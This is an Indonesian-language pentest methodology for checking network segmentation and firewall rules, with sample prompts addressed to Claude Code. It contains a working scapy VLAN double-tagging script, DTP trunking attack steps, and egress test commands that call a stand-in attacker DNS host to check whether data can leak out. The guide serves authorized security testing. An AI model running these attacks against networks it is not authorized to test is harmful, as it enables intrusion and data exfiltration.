# Network Pentest: Segmentasi Jaringan & Firewall

**Target:** Firewall rules, VLAN segmentation, ACL, network policy  
**Tujuan:** Verifikasi bahwa segmentasi jaringan benar-benar memblokir traffic yang tidak diinginkan  
**Durasi:** 3–5 hari

---

## Mengapa Segmentasi Penting

Segmentasi yang buruk memungkinkan penyerang yang berhasil masuk ke satu zona
(misal: guest WiFi atau DMZ) untuk **pivot** ke zona lain yang lebih sensitif
(internal network, database server, OT network).

---

## Skenario Umum

| Sub-skenario | Tujuan |
|-------------|--------|
| Firewall rule review (white box) | Audit konfigurasi firewall secara manual |
| Segmentation testing (grey box) | Test dari setiap zona apakah isolasi benar-benar bekerja |
| VLAN hopping | Bypass VLAN segmentation via Layer 2 attack |
| ACL bypass | Temukan celah di Access Control List |

---

## Phase 1: Network Topology Mapping

```bash
# Identifikasi zona jaringan dari posisi saat ini
ip route
traceroute 10.10.10.1     # trace path ke zona lain
traceroute 172.16.0.1

# Identifikasi firewall dari TTL behavior
# TTL berkurang 1 setiap hop — hop dengan TTL tidak turun = stateful firewall

# Nmap firewall detection
nmap -sA 192.168.1.1  # ACK scan — identifikasi stateful vs stateless
nmap -sF 192.168.1.1  # FIN scan
nmap -sN 192.168.1.1  # NULL scan
```

**Prompt Claude Code:**
```
Saya berada di VLAN Guest (10.0.10.0/24).
Target: verifikasi tidak bisa reach zona Internal (10.0.1.0/24) dan Server (10.0.2.0/24).

Test results:
- ping 10.0.1.10 → BLOCKED (benar)
- ping 10.0.2.20 → BLOCKED (benar)
- curl http://10.0.2.20:8080 → BLOCKED (benar)
- curl http://10.0.2.20:80 → SUCCESS ← masalah!
- nslookup internal.corp.local → SUCCESS (DNS bocor info internal)

Analisis temuan dan berikan attack scenario yang mungkin.
```

---

## Phase 2: Firewall Rule Testing Sistematis

```bash
# Test setiap port dari setiap zona
# Buat matrix: zona asal → zona tujuan → port → allowed/blocked

#!/bin/bash
# firewall_test.sh

ZONES=(
  "10.0.1.10:Internal-Server"
  "10.0.2.10:DB-Server"
  "10.0.3.10:OT-Network"
)

PORTS="22 23 25 53 80 443 445 1433 3306 3389 5985 8080"

for zone_info in "${ZONES[@]}"; do
  IP=$(echo $zone_info | cut -d: -f1)
  NAME=$(echo $zone_info | cut -d: -f2)
  echo "=== Testing access to $NAME ($IP) ==="
  for port in $PORTS; do
    result=$(timeout 2 bash -c "echo >/dev/tcp/$IP/$port" 2>/dev/null && echo "OPEN" || echo "BLOCKED")
    echo "Port $port: $result"
  done
done
```

---

## Phase 3: VLAN Hopping

### Double Tagging Attack

```bash
# Setup interface untuk 802.1Q double tagging
# Syarat: tester terhubung ke native VLAN yang sama dengan trunk

# Install scapy
pip install scapy

# Double tag attack script
from scapy.all import *

# Frame dengan dua 802.1Q tag
# Tag pertama (outer): native VLAN yang kita gunakan
# Tag kedua (inner): target VLAN yang ingin kita akses

outer_vlan = 1    # native VLAN
inner_vlan = 100  # target VLAN (internal network)

packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=outer_vlan) / \
         Dot1Q(vlan=inner_vlan) / \
         IP(dst="10.0.1.10") / \
         ICMP()

sendp(packet, iface="eth0", count=5)
```

### DTP Attack (Dynamic Trunking Protocol)

```bash
# Kirim DTP frame untuk negotiate trunk dengan switch
sudo yersinia -I
# Pilih: 802.1Q → pilih: Enabling trunk

# Setelah trunk terbentang, buat sub-interface untuk tiap VLAN
sudo ip link add link eth0 name eth0.100 type vlan id 100
sudo ip addr add 10.0.100.2/24 dev eth0.100
sudo ip link set eth0.100 up
```

---

## Phase 4: Firewall Configuration Review (White Box)

```bash
# Cisco ASA
show running-config
show access-list
show nat

# pfSense/OPNsense (via SSH atau console)
cat /cf/conf/config.xml | grep -A5 "filter"

# iptables (Linux-based firewall)
sudo iptables -L -n -v
sudo iptables -t nat -L -n -v
```

**Prompt Claude Code:**
```
White box review — iptables rules dari firewall Linux:

Chain FORWARD (policy DROP)
target  prot  source          destination
ACCEPT  all   10.0.10.0/24   10.0.1.0/24   /* guest to internal — SALAH! */
ACCEPT  tcp   10.0.10.0/24   10.0.2.0/24   dpt:80
ACCEPT  tcp   10.0.10.0/24   10.0.2.0/24   dpt:443
DROP    all   anywhere        anywhere

Dan Cisco ACL dari core switch:
permit ip 10.0.10.0 0.0.0.255 any   /* terlalu permissif! */
deny   ip any any

Identifikasi:
1. Rule mana yang terlalu permissif?
2. Zona mana yang seharusnya tidak bisa akses zona lain?
3. Principle of least privilege — tulis ulang rules yang benar
4. Apakah ada north-south filtering selain east-west?
```

---

## Phase 5: Egress Filtering Testing

```bash
# Test apakah traffic keluar dibatasi
# Penyerang sering pakai port 80/443 untuk C2 karena biasanya diizinkan

# Dari dalam jaringan, test koneksi keluar
curl http://external-server.com:80
curl https://external-server.com:443
curl http://external-server.com:4444  # port non-standar
nc -zv external-server.com 22         # SSH keluar

# DNS tunneling (jika hanya DNS yang diizinkan keluar)
# Test: apakah bisa kirim data via DNS query?
nslookup testdata.attacker-dns.com
```

---

## Checklist Segmentasi & Firewall Pentest

```
[ ] Map semua zona jaringan (guest, internal, server, OT, DMZ)
[ ] Test setiap kombinasi zona → porta (matrix lengkap)
[ ] VLAN hopping attempt (double tag, DTP)
[ ] Firewall rule review (white box jika tersedia)
[ ] Egress filtering test (port apa yang bisa keluar?)
[ ] DNS filtering test (apakah bisa resolve domain eksternal?)
[ ] Test bypass via encapsulation (HTTP tunnel, DNS tunnel)
[ ] Laporan: matrix allowed/blocked + recommended rules
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| Segmentation testing (grey box) | 2–3 hari | 4–6 hari |
| Firewall config review (white box) | 3–5 hari | 7–10 hari |
